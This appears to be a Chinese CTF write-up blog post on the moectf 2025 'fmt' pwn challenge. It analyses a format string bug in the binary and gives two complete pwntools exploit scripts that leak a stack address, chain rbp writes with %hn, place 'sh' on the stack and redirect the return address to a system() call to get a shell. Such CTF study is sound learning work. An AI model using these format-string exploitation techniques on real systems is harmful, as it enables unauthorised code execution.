---
title: moectf-2025-pwn-fmt
tags:
    - fmt
    - pwn
categories:
    - 比赛记录
cover: /img/治不开心药.png
---
# fmt

## 前言

一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。
[一次有趣的格式化字符串漏洞利用 | ZIKH26's Blog](https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4)
开始研究

## ida分析

### main函数

![image-20250810223742657](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png)

功能非常的简单，

1. 循环3次调用talk，需要控制flag的值（后续再看）
2. atk判断，成功则调用he()

先看he()里有啥。

### he函数

![image-20250810224024236](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png)

这里建议看汇编，

1. system的出现，让人思路开朗
2. command是`-0xe`，也就是要控制`rbp-0xe`
3. 注意lea 和 mov 的区别，通过这个方法的话，必须要把"/bin/sh"写在栈上

一般揣测一下出题人的想法，肯定是最后要返回到这里了。

### talk函数

![image-20250810224845139](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png)

重点来了，

1. 非栈上格式化字符串,每次只读0x20字节
2. flag初始是0,talk会把它变成1,想办法置0
3. 返回到了my_read,继续追踪

![image-20250810225109891](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png)

看看bss段上,这些变量的位置

![image-20250810225315432](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png)

atk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.

## 思路分析

1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell
2.但是，常规的思路，需要的格式化次数不止3次。

> 1. %p泄露栈地址
> 2. 把rbp链入（因为此题目栈上无`诸葛连弩`，要自己建）
> 3. 修改啥也不行，没次数了

3.所以笔者在这里用了一些奇怪的方法。

>1. 笔者开始想，因为`i`也是在栈上的，所以我可以修改`i`来增加次数
>2. 但是，恰因如此，如果修改rbp，那么会影响下次循环对`i`的判断，
>3. 于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。
>4. 所以在笔者的精心的构造下，完成了10次格式化字符串的修改。
>5. 比较重要的就是两个$n的运用。一个把`sh`写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.

4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.

## exp

### 10次格式化字符串

```python
from esy import *
context.log_level="debug"
#context.terminal=["tmux","splitw","-h","-l","66%"]
io,elf=loadfile("./pwn")


# 1 leak stack
payload=b"%8$p"
io.sendafter("...\n",payload)
rbp=int(io.recv(14),16)-0x20
#logv("rbp",hex(rbp))
rbp_low=rbp & 0xffff
fmt_low=0x4040c0 & 0xffff
io.sendafter("battle!",b"a"*8)

#2，3 rbp链入,修改rbp 
payload = '%{}c%6$hn'.format(rbp_low).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)

payload = '%{}c%47$hn\x00'.format(rbp_low+0x38).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
#4,5,6 'sh'写入栈,修改rbp,把rbp+0x3e-4 链入并置0
payload = '%{}c%8$n\x00'.format(0x6873).encode() # 1 canshuxieshangl

io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)

payload = '%{}c%47$hn'.format(rbp_low+0x58).encode()
payload+= '%{}c%6$hn\x00'.format((0x38+0xe-4-0x58+0x10000)%0x10000).encode() # 0
print(5)
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)

payload = '%{}c%47$n\x00'.format(0x00).format() # 1
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)


######7 把rbp再次链入
payload = '%{}c%6$hn\x00'.format(rbp_low).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
#####8 修改rbp 为rbp_low+0x38+0xe
payload = '%{}c%47$hn\x00'.format(rbp_low+0x38+0xe).encode()
payload = payload.ljust(0x20,b'\x00')
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
gdb.attach(io,"b *0x401332")
##### 9 把rbp+8 链入
payload = '%{}c%6$hn\x00'.format(rbp_low+8).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
##### 10 修改返回地址
payload = '%{}c%47$hn'.format(0x1274).encode()
print(len(payload))
payload +=b'/bin/sh\x00'
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
io.interactive()


```

### 优雅至极

```python
from esy import *
context.log_level="debug"
#context.terminal=["tmux","splitw","-h","-l","66%"]
io,elf=loadfile("./pwn")
gdb.attach(io,"b *0x401332")

# 1 leak stack
payload=b"%8$p"
io.sendafter("...\n",payload)

rbp=int(io.recv(14),16)-0x20
#logv("rbp",hex(rbp))
rbp_low=rbp & 0xffff
fmt_low=0x4040c0 & 0xffff
io.sendafter("battle!",b"a"*8)

#2 gouzao 
payload =  b"%p" * 4 
payload += '%{}c%hn'.format(rbp_low+0x20-0x4-40).encode()
payload+= '%{}c%47$hn'.format((0x6873-(rbp_low+0x20)+0xe)).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)

# 3 
payload = b"%p" *4 
payload+= '%{}c%hn'.format(rbp_low+0x12-40).encode()
payload+= '%{}c%47$hn'.format((0x1274-(rbp_low+0x38)+0x30+0x10000)%0x10000).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)

io.interactive()

```

